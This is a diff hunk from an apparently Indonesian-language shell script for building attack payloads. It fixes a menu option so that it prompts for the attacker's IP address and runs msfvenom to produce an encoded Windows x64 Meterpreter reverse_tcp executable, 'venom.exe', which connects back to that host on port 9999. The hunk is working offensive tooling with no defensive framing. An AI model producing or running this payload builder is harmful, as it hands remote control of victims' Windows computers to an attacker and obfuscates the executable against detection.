@@ -247,9 +247,9 @@ echo "[!]RUNNING TOOLS CREATE PAYLOAD TO IMAGE" | lolcat
 echo "##################################################################################"
 sleep 5
 ifconfig
-echo "╭─[Ketik LHOST=IP LPORT=9999]" | lolcat
-read -p"╰─>> " lhost lport
-msfvenom -p windows/x64/meterpreter/reverse_tcp $lhost $lport -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
+echo "╭─[Masukan IP Address Komputer/Laptop]" | lolcat
+read -p"╰─>> " lhost
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=9999 -a x64 --platform windows -e x64/zutto_dekiru -i 10 -n 500 -f exe -o venom.exe
 fi
 
 if [ $pil = j ]
